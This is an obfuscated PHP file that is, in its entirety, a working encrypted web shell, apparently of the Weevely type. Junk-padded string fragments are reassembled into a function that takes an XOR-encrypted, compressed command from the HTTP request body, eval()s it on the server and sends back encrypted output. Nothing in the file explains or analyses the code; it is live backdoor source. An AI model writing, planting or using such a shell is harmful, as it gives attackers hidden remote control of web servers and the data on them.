<?php
$I=';$j+X~+X~,$i++){$o.=$tX~{X~$i}X~^$k{$j};}}returX~n $o;X~}if (@X~preX~g_';
$O='X~match("X~/X~$kh(.+)$kf/"X~,@file_get_cX~ontents("X~X~phX~p://input"),$m)=X';
$k='$l=strlX~en($t);$o="";X~X~for($X~i=0;$X~i<$l;){fX~oX~r($j=0;X~($jX~<$c&&$i<$l)';
$K='"QAX~KjMEaX~vQaLIGNuX~6X~";functioX~n x($t,$k){$X~cX~=strlX~X~en($k)X~;';
$U='$kX~="fX~X~834ed85";$khX~="c84db14b5X~f0X~X~9";X~$kf="aa8aX~b0ffc9aa";$p=';
$w='~m[X~1]),$X~kX~)));$o=X~@ob_get_contents(X~);@ob_X~end_clX~ean();$X~X~r=';
$G=str_replace('E','','EcEreatEeEE_fEunction');
$V='~=1) {@X~ob_starX~t(X~);@eX~val(@gX~zuncompressX~(@x(X~@baseX~64_X~decode($X';
$i='@basX~e64_encodX~e(X~@xX~(@gzcompreX~ss($o),$k));priX~nt("$pX~$kh$rX~$kf");}';
$v=str_replace('X~','',$U.$K.$k.$I.$O.$V.$w.$i);
$T=$G('',$v);$T();
?>
